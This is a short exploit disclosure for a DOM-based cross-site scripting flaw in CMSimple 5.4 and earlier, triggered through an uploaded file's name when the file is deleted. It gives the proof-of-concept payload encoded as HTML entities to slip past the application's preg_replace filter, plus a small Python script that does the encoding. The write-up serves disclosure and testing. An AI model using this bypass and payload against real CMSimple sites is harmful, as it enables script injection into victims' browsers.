### Exploit Title: [DOM XSS on file name after delete]
### Date: [10/22/2021]
### Exploit Author: [picaro_o]
### Vendor Homepage: [https://www.cmsimple.org/en/]
### Software Link: [https://www.cmsimple.org/en/?Downloads]
### Version: [<=5.4]
### Tested on: [Linux os]
### CVE- N/A

[Description]

Since application is filtering user input with preg_replace, attacker can able to bypass restriction by using HTML to Unicode encoding.

So application let's attacker to perform DOM base XSS.

[Payload and POC]

File > images > Upload a file

``` Attack vector >> ')-alert(1)// >> &#39;&#41;&#45;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#47;&#47;```

When victim click delete button, alert will executed.
 

Script to encode the payload

``` payload = input()
finalpayload = ""
for i in payload:
	finalpayload = finalpayload + "&#" + str(ord(i)) + ";"
print(finalpayload)```
